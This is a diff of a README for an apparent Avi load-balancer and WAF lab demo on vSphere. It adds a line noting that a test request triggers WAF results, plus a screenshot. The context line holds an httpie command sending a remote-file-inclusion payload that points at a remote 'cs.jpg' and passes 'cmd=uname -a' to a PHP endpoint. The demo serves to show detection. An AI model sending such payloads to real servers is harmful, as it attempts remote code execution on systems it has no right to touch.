@@ -284,6 +284,8 @@ $(terraform output -json | jq -r .Destroy_command_avi_config_only.value) ; terra
     ```shell
     http --verify=no "https://secure-ingress.cluster1.avi.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a"
     ```
+  - Triggers WAF results
+    ![Alt text](img/waf-results.png?raw=true "WAF Results")
 
 - Credits
   Nicolas Bayle who started this project and myself fine tuned the code so it can be used in any vSphere env.
